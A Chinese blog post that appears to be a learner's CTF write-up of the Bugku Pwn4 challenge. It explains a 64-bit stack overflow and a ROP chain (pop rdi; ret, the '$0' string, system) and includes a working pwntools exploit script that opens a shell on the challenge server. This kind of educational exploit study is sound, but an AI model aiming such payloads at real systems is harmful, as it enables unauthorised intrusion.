<!DOCTYPE html><html class="theme-next gemini use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"><link rel="stylesheet" href="/css/main.css?v=7.1.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0"><link rel="icon" type="image/png" sizes="32x32" href="/images/xintiao_32.png?v=7.1.0"><link rel="icon" type="image/png" sizes="16x16" href="/images/xintiao_16.png?v=7.1.0"><link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222"><link rel="manifest" href="/images/manifest.json"><meta name="msapplication-config" content="/images/browserconfig.xml"><script id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Gemini",version:"7.1.0",sidebar:{position:"left",display:"post",offset:12,onmobile:!1,dimmer:!1},back2top:!0,back2top_sidebar:!0,fancybox:!1,fastclick:!1,lazyload:!0,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><meta property="og:type" content="article"><meta property="og:title" content="Bugku-Pwn4"><meta property="og:url" content="http://liul14n.top/2019/08/04/Bugku-Pwn4/index.html"><meta property="og:site_name" content="LiuLian"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/234.jpg"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804232504.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804232415.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190121214504284.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804233243.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805002508.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804233839.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804234040.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804234015.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804234057.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804234121.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804235517.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805000402.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805000931.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805001027.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805001155.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805001350.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805001612.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805001710.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805003032.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805003257.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805003417.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805004826.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805005107.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805005804.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/23481.jpg"><meta property="og:updated_time" content="2019-09-06T05:43:43.333Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Bugku-Pwn4"><meta name="twitter:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/234.jpg"><link rel="canonical" href="http://liul14n.top/2019/08/04/Bugku-Pwn4/"><script id="page.configurations">CONFIG.page={sidebar:""}</script><title>Bugku-Pwn4 | LiuLian</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-title,.use-motion .comments,.use-motion .menu-item,.use-motion .motion-element,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .logo,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN"><div class="container sidebar-position-left page-post-detail"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">LiuLian</span> <span class="logo-line-after"><i></i></span></a></div></div><div class="site-nav-toggle"><button aria-label="切换导航栏"><span class="btn-bar"></span> <span class="btn-bar"></span> <span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br>分类<span class="badge">8</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br>归档<span class="badge">59</span></a></li></ul></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><div id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://liul14n.top/2019/08/04/Bugku-Pwn4/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="LiuLian"><meta itemprop="description" content="Salute The Time"><meta itemprop="image" content="/images/touxiang.jpeg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="LiuLian"></span><header class="post-header"><h2 class="post-title" itemprop="name headline">Bugku-Pwn4</h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2019-08-04 23:20:27" itemprop="dateCreated datePublished" datetime="2019-08-04T23:20:27+08:00">2019-08-04</time> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-calendar-check-o"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2019-09-06 13:43:43" itemprop="dateModified" datetime="2019-09-06T13:43:43+08:00">2019-09-06</time> </span><span class="post-category"><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-folder-o"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a></span> </span><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-eye"></i> 阅读次数： <span class="busuanzi-value" id="busuanzi_value_page_pv"></span></span><div class="post-symbolscount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i> </span><span class="post-meta-item-text">本文字数：</span> <span title="本文字数">13k</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span title="阅读时长">11 分钟</span></div></div></header><div class="post-body" itemprop="articleBody"><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/234.jpg" alt></p><a id="more"></a><h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><ul><li><p>新接触Pwn不久,以这道题为例,记录一下自己的学习经历。</p></li><li><p>这道题在网上能搜到WP,比着WP能很容易做出来,但是对没啥pwn基础的我来说想要弄懂却不容易。</p></li><li><p>写这篇文章希望能帮助到想搞懂这道题目但是却不能被现有的wp满足的pwner们。</p></li></ul><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=33856223&auto=1&height=66"></iframe><h1 id="0x01理论分析"><a href="#0x01理论分析" class="headerlink" title="0x01理论分析"></a>0x01理论分析</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804232504.png" alt></p><ul><li>检查了一番,没开启啥保护。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804232415.png" alt></p><ul><li>根据main函数能看出来是考察的栈溢出, <code>memset</code>对<code>s</code>只开辟了<code>0x10</code>大小的空间,但是<code>read</code>却读入了<code>0x30</code>个字节, 会造成溢出。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190121214504284.png" alt></p><ul><li><p>这是一张在别的地方拿来的图(32位), <code>0x28</code>个字节的栈空间下面是<code>EBP</code>和<code>返回地址</code>。</p></li><li><p>64位程序类似, 只不过EBP变成RBP 然后它们的大小都变成了0x8个字节,那些Hello能写到一行,World能写到一行了。</p></li><li><p>按照一般思路, 需要覆盖掉<code>EBP</code>, 然后 再将返回地址覆盖成我们想让程序跳转到的地址,一般是调到能拿到<code>shell</code>的地方比如<code>System(&quot;/bin/sh&quot;)</code></p></li><li><p>那么搜索关键字符串<code>/bin/sh</code></p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804233243.png" alt></p><ul><li>并没有找到,但是却有<code>$0</code></li><li>在Linux中:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$<span class="comment"># 是传给脚本的参数个数 </span></span><br><span class="line">$<span class="number">0</span> 是脚本本身的名字 </span><br><span class="line">$<span class="number">1</span>是传递给该shell脚本的第一个参数 </span><br><span class="line">$<span class="number">2</span>是传递给该shell脚本的第二个参数 </span><br><span class="line">$@ 是传给脚本的所有参数的列表</span><br></pre></td></tr></table></figure><blockquote><p><code>$0</code>在linux中为为shell或shell脚本的名称</p></blockquote><blockquote><p><code>system()</code>会调用<code>fork()</code>产生子进程，由子进程来调用<code>/bin/sh -c string</code>来执行参数<code>string</code>字符串所代表的命令，此命令执行完后随即返回原调用的进程。</p></blockquote><blockquote><p>所以如果将<code>$0</code>作为<code>system</code>的参数，能达到传入<code>&#39;/bin/sh&#39;</code>一样的效果。</p></blockquote><ul><li>即<code>system(&quot;$0&quot;) == system(&#39;bin/sh&#39;)</code></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805002508.png" alt></p><ul><li><p><code>$0</code>在这一句的末端, 直接查偏移就行,即从<code>0000000000601100</code>开始往右数,看第几个是<code>$</code>就行。</p></li><li><p>举个例子:<code>0000000000601100</code>代表这一整串,<code>0000000000601101</code>代表从9往后(包括9)这一整串,<code>0000000000601102</code>代表从8往后(包括8)这一串…..</p></li><li><p>以此类推得到<code>$0</code>的地址为<code>0x000000000060111f</code></p></li><li><p>得到了一个<code>/bin/sh</code> 但是还需要能够调用这个<code>/bin/sh</code>的函数,也就是<code>system()</code>函数</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804233839.png" alt></p><ul><li>通过在IDA查看import调用, 找到了<code>system</code>函数</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804234040.png" alt></p><ul><li>现在需要得到它的地址。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804234015.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804234057.png" alt></p><ul><li>把这个Line prefixes(graph) 前面的勾打上就能显示地址了。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804234121.png" alt></p><ul><li><p>这样得到了<code>system</code>函数的地址为<code>0x000000000040075A</code></p></li><li><p>根据之前的思路, 我们通过覆盖程序的返回地址来让程序跳转到我们想让它跳到的地方。但是,只调到<code>system</code>函数是不够的,因为我们还没有把<code>/bin/sh</code>这个参数给它传进去。(调用函数前需要先传入参数)</p></li><li><p>所以现在需要先把参数传进去。</p></li></ul><blockquote><p>64位程序和32位程序的传参方式不一样，32位的函数调用使用栈传参，64位的函数调用使用寄存器传参，分别用<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>来传递参数（参数个数小于7的时候）。</p></blockquote><ul><li>我们的参数只有一个,所以是用rdi来传参的。</li></ul><h2 id="小难点"><a href="#小难点" class="headerlink" title="小难点"></a>小难点</h2><ul><li><p>以下内容可能会有些迷,别急,后续会有详细的调试以及讲解。</p></li><li><p>我们需要将参数pop到rdi中,因此我们需要调用<code>pop rdi;ret</code>所以我们去找这条命令的地址。</p></li><li><p>关于为什么是<code>pop rdi;ret</code> 而不只是<code>pop rdi</code>,后续也会有讲解。</p></li><li><p>可以利用<code>ROPgadget</code>工具进行查找。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804235517.png" alt></p><ul><li>这样我们得到了<code>pop rdi;ret</code>的地址<code>0x00000000004007d3</code>。</li></ul><h1 id="0x02拿Flag"><a href="#0x02拿Flag" class="headerlink" title="0x02拿Flag"></a>0x02拿Flag</h1><ul><li>先给出脚本,运行脚本前需要安装pwntools:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'114.116.54.89'</span>, <span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004007d3</span> </span><br><span class="line">bin_sh = <span class="number">0x000000000060111f</span></span><br><span class="line">system = <span class="number">0x000000000040075A</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'A'</span>*<span class="number">0x10</span> <span class="comment">#这0x10个是用来覆盖那0x10字节的栈空间的。</span></span><br><span class="line">payload += <span class="string">'A'</span>*<span class="number">0x8</span> <span class="comment">#这0x8是覆盖RBP的,因为是64位程序,RBP大小为0x8</span></span><br><span class="line">payload += p64(pop_rdi_ret) <span class="comment">#64位程序用p64,这三行为什么是这个顺序,待会会有讲解。</span></span><br><span class="line">payload += p64(bin_sh) </span><br><span class="line">payload += p64(system)  </span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Come on,try to pwn me'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><ul><li>运行即可拿到flag</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805000402.png" alt></p><h1 id="0x03调试与分析"><a href="#0x03调试与分析" class="headerlink" title="0x03调试与分析"></a>0x03调试与分析</h1><ul><li>通过IDA server来调试一下程序。(这个具体怎么操作,百度就行,有很详细的教程)</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805000931.png" alt></p><ul><li>在大佬的指导下写了另一个用来调试的脚本<code>exp.py</code>。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805001027.png" alt></p><ul><li><p>运行<code>linux_server64</code> 同时 运行<code>exp</code></p></li><li><p>在IDA选择<code>Remote Linux debugger</code>,然后选择<code>Attach to process...</code></p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805001155.png" alt></p><ul><li>然后<code>Ctrl+F</code>搜索 pwn4</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805001350.png" alt></p><ul><li><p>选中点击确定即可调试。</p></li><li><p>在<code>read</code>后的一句下断点。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805001612.png" alt></p><ul><li><p>也就是图中紫色这一句。 然后F8单步</p></li><li><p>在栈窗口能看到我们的payload已经传入了。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805001710.png" alt></p><h2 id="第1点"><a href="#第1点" class="headerlink" title="第1点"></a>第1点</h2><ul><li>那两行414141…就是’A’*0x10</li></ul><h2 id="第2点"><a href="#第2点" class="headerlink" title="第2点"></a>第2点</h2><ul><li>那一行616161…就是’a’*0x8,这里是<code>RBP</code>所在的地方(现在依然也是RBP所在的地方,只不过内容变了),现在被这一串61覆盖了。</li></ul><h2 id="第3点"><a href="#第3点" class="headerlink" title="第3点"></a>第3点</h2><ul><li>而<code>0x00000000004007D3</code>所在位置,曾经是<code>原本程序的返回地址</code>,现在这个位置依然是<code>返回地址</code>,不过变成<code>pop rdi;ret</code>的地址了, 也就是说程序会返回到<code>pop rdi;ret</code>的地址执行<code>pop rdi;ret</code>,而不会按程序原本的逻辑来执行了。</li></ul><h2 id="第4点"><a href="#第4点" class="headerlink" title="第4点"></a>第4点</h2><ul><li><code>0x000000000060111F</code>就是<code>$0</code>即<code>/bin/sh</code>的地址了。</li></ul><h2 id="第5点"><a href="#第5点" class="headerlink" title="第5点"></a>第5点</h2><ul><li><code>0x000000000040075A</code>即<code>system函数的地址</code></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805003032.png" alt></p><ul><li><p>单步来到这,是一个<code>leave</code>指令,这个指令等价于<code>mov rsp,rbp</code> ，<code>pop rbp</code></p></li><li><p>执行前,栈和寄存器的状态是这样的,注意观察<code>RSP</code>,<code>RBP</code>。</p></li><li><p>栈窗口中深色的那一行即为RSP目前指向的位置。<br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805003257.png" alt></p></li><li><p>执行后是这样的。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805003417.png" alt></p><ul><li>这说明了上述第2点和第3点。</li></ul><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><ul><li><p>我在分析的时候产生了这样的疑惑。</p></li><li><p><code>leave</code>相当于<code>mov rsp,rbp</code> ，<code>pop rbp</code></p></li><li><p>那<code>mov rsp,rbp</code>以后 rsp应该指向<code>61616161...</code>那一行啊,为什么现在却指向了<code>61616161...</code>下面的那一行?</p></li><li><p>请教大佬后得知,这是因为<code>pop rbp</code>相当于<code>mov rbp,[rsp]</code>,<code>add rsp,0x8</code></p></li><li><p>32位的话就是<code>add esp,0x4</code></p></li><li><p>这样就导致了rsp指向了现在它所指的位置。</p></li><li><p>接下来就要执行<code>retn</code>指令了。</p></li><li><p><code>retn</code>，等价于<code>pop rip</code></p></li><li><p><code>rip</code>存放的是下一条指令的地址。</p></li><li><p><code>pop rip</code>就相当于把<code>rsp指向的东西</code>传入到<code>rip</code>中,现在<code>rsp</code>指向的是我们传进去的<code>pop rdi;ret</code>的地址, 所以这样就能让<code>rip</code>里存的是<code>pop rdi;ret</code>的地址,所以执行完<code>retn</code>后就会执行<code>pop rdi;ret</code>。</p></li><li><p>F8单步运行,<code>rip</code> 如我们所愿变成了<code>pop rdi;ret</code>的地址, 左侧窗口也变成了<code>pop rdi</code>的位置,<code>rsp</code>指向了<code>$0</code>即<code>/bin/sh</code>所在的地方。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805004826.png" alt></p><ul><li><p>接着单步运行的话, 会执行<code>pop rdi</code>指令,就能将<code>rsp</code>现在所指的<code>/bin/sh</code>传入到<code>rdi</code>中,用<code>rdi</code>来为<code>system函数</code>进行传参。</p></li><li><p>继续F8单步运行。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805005107.png" alt></p><ul><li><p>如我们所愿。左侧来到了<code>retn</code>的位置,现在来讲一下前面留下来的问题:“当时找的为什么是<code>pop rdi;ret</code> 而不只是<code>pop rdi</code>”</p></li><li><p>假设我们用的<code>pop rdi</code>,确实能够将<code>/bin/sh</code>传入到<code>rdi</code>中,但是我们就没办法执行<code>system函数</code>了,因为如果用<code>pop rdi</code>的话,执行完<code>pop rdi</code>以后就没有指令能将<code>rip</code>执行<code>system函数</code>的地址了。</p></li><li><p>为了更好地说明问题,再观察一下现在的栈及寄存器的情况。</p></li><li><p><code>rsp</code>指向了<code>system函数</code>的地址, <code>rip</code>中存的是<code>retn</code>指令的地址,下一步就会执行<code>retn</code>,执行完以后<code>rip</code>里存的就是<code>system函数</code>的地址了,然后就能执行<code>system函数</code>了。</p></li><li><p>继续F8单步运行。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805005804.png" alt></p><ul><li>如我们所愿,<code>rip</code>指向了<code>system函数</code>的地址,<code>rdi</code>里存的是<code>/bin/sh</code>这样就能调用<code>system函数</code>了,就能得到shell了。</li></ul><h1 id="0x04写在最后"><a href="#0x04写在最后" class="headerlink" title="0x04写在最后"></a>0x04写在最后</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/23481.jpg" alt></p><ul><li>我新接触pwn,还在慢慢爬坑,很用心地写了这篇文章来帮助同样在爬坑的人学习pwn,如果有什么地方有不足之处,希望大佬们能帮我指出。</li></ul></div><div><div><div style="text-align:center;color:#ccc;font-size:14px">-------------至此本文结束<i class="fa fa-tree"></i>感谢您的阅读-------------</div></div></div><div><div id="reward-container"><div>如果觉得这篇文章对您有用，请随意打赏。 (๑•⌄•๑) 您的支持将鼓励我继续创作！</div><button id="reward-button" disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">打赏</button><div id="qr" style="display:none"><div style="display:inline-block"><img src="/images/Wechat_SKM.png" alt="LiuLian 微信支付"><p>微信支付</p></div><div style="display:inline-block"><img src="/images/ZFB_SKM.png" alt="LiuLian 支付宝"><p>支付宝</p></div></div></div></div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>LiuLian</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="http://liul14n.top/2019/08/04/Bugku-Pwn4/" title="Bugku-Pwn4">http://liul14n.top/2019/08/04/Bugku-Pwn4/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><footer class="post-footer"><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/2019/07/28/SKSEC-Summer-Training/" rel="next" title="SKSEC Summer Training"><i class="fa fa-chevron-left"></i> SKSEC Summer Training</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"><a href="/2019/08/08/攻防世界-Pwn/" rel="prev" title="攻防世界-Pwn">攻防世界-Pwn <i class="fa fa-chevron-right"></i></a></div></div></footer></div></article></div></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span> <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span> <span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">文章目录</li><li class="sidebar-nav-overview" data-target="site-overview-wrap">站点概览</li></ul><div class="site-overview-wrap sidebar-panel"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" src="/images/touxiang.jpeg" alt="LiuLian"><p class="site-author-name" itemprop="name">LiuLian</p><div class="site-description motion-element" itemprop="description">Salute The Time</div></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">59</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">8</span> <span class="site-state-item-name">分类</span></a></div></nav><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/LiuL14n" title="GitHub &rarr; https://github.com/LiuL14n" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a> </span><span class="links-of-author-item"><a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=aFlZWl1aWVxcWVEoGRlGCwcF" title="E-Mail &rarr; http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=aFlZWl1aWVxcWVEoGRlGCwcF" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a> </span><span class="links-of-author-item"><a href="http://wpa.qq.com/msgrd?v=3&uin=1125214419&site=qq&menu=yes" title="QQ &rarr; http://wpa.qq.com/msgrd?v=3&uin=1125214419&site=qq&menu=yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a></span></div><div class="links-of-blogroll motion-element links-of-blogroll-block"><div class="links-of-blogroll-title"><i class="fa fa-fw fa-link"></i> From 大佬 import&nbsp; <i class="fa fa-fw fa-link"></i></div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"><a href="https://suxinghe39.github.io/" title="SuXingHe" target="_blank">SuXingHe</a></li><li class="links-of-blogroll-item"><a href="https://hal900000.github.io" title="Hal90000" target="_blank">Hal90000</a></li><li class="links-of-blogroll-item"><a href="http://n4tsu.top/" title="Natsu" target="_blank">Natsu</a></li><li class="links-of-blogroll-item"><a href="https://dililidala.github.io" title="Ohrxw" target="_blank">Ohrxw</a></li><li class="links-of-blogroll-item"><a href="http://www.wendev.site" title="JiangWen" target="_blank">JiangWen</a></li><li class="links-of-blogroll-item"><a href="https://l0ne1y.xyz/" title="L0ne1y" target="_blank">L0ne1y</a></li></ul><div id="days"></div><script>function show_date_time(){window.setTimeout("show_date_time()",1e3),BirthDay=new Date("04/25/2019 21:13:14"),today=new Date,timeold=today.getTime()-BirthDay.getTime(),sectimeold=timeold/1e3,secondsold=Math.floor(sectimeold),msPerDay=864e5,e_daysold=timeold/msPerDay,daysold=Math.floor(e_daysold),e_hrsold=24*(e_daysold-daysold),hrsold=setzero(Math.floor(e_hrsold)),e_minsold=60*(e_hrsold-hrsold),minsold=setzero(Math.floor(60*(e_hrsold-hrsold))),seconds=setzero(Math.floor(60*(e_minsold-minsold))),document.getElementById("days").innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒"}function setzero(e){return e<10&&(e="0"+e),e}show_date_time()</script></div></div></div><div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"><div class="post-toc"><div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00前言"><span class="nav-number">1.</span> <span class="nav-text">0x00前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01理论分析"><span class="nav-number">2.</span> <span class="nav-text">0x01理论分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#小难点"><span class="nav-number">2.1.</span> <span class="nav-text">小难点</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02拿Flag"><span class="nav-number">3.</span> <span class="nav-text">0x02拿Flag</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03调试与分析"><span class="nav-number">4.</span> <span class="nav-text">0x03调试与分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#第1点"><span class="nav-number">4.1.</span> <span class="nav-text">第1点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第2点"><span class="nav-number">4.2.</span> <span class="nav-text">第2点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第3点"><span class="nav-number">4.3.</span> <span class="nav-text">第3点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第4点"><span 